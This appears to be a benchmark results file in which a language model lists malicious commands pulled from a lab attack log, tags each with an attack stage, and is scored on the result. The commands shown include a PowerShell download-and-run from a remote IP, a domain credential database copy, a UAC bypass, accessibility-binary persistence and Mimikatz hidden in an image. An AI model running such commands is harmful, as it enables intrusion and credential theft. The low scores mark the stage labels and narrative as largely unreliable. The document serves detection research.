@@ -1,0 +1,148 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u260f'\u0564\u0556\u0583B.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "esentutl.exe  /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\" ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Set-ItemProperty -Path \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\fodhelper.exe\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": " powershell.exe -ExecutionPolicy Bypass -C \"$input_table = \\\"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\\\".Split(\",\") Foreach ($item in $input_table){$item = $item.Trim() $registryPath = \\\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\\\" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name Debugger -V \"C:\\Windows\\System32\\cmd.exe\" } }\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "Registry add \"HKLCU\\Environment\" /v \"windir\" /d \"cmd /c start powershell&REM \"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": " schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": ".\\chromeRemoteServices.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "python.exe  C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe \"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers have gained access to the system through various methods such as exploiting vulnerabilities in browser extensions, using social engineering tactics, and utilizing exploits for known vulnerabilities. They use various techniques to evade detection including hiding files, using encoded scripts, and creating fake registry entries. The attackers also attempt to gather information about the system configuration, user accounts, installed software, and running processes. They proceed to escalate privileges by manipulating service configurations and registry settings.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19736,
+      "completion_tokens": 1229,
+      "total_tokens": 20965,
+      "wall_clock_s": 63.325,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.375,
+      "f1": 0.3,
+      "tp": 6,
+      "fp": 18,
+      "fn": 10
+    },
+    "stage": {
+      "precision": 0.08333333333333333,
+      "recall": 0.14285714285714285,
+      "f1": 0.10526315789473685,
+      "tp": 2,
+      "fp": 22,
+      "fn": 12,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.08333333333333333,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19736,
+      "completion_tokens": 1229,
+      "total_tokens": 20965,
+      "wall_clock_s": 63.325,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
